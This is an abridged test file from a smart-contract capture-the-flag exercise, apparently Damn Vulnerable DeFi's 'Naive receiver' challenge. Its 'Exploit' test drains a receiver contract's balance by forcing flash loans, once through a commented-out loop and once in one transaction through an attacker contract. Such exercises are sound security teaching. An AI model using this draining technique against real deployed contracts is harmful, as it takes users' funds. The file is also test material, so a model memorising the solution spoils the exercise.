...
describe("[Challenge] Naive receiver", function () {
  ...
  before(async function () {
    ...
    this.attacker = await AttackerContractFactory.deploy(this.pool.address);
  ...
  it("Exploit", async function () {
    ...
    //Drain user's balance within 10 transaction
    // while ((await ethers.provider.getBalance(this.receiver.address)) > 0) {
    //   await this.pool.flashLoan(this.receiver.address, 0);
    // }

    //Drain user's balance with one transaction using customize smart contract
    await this.attacker.drainReceiver(this.receiver.address);
  });
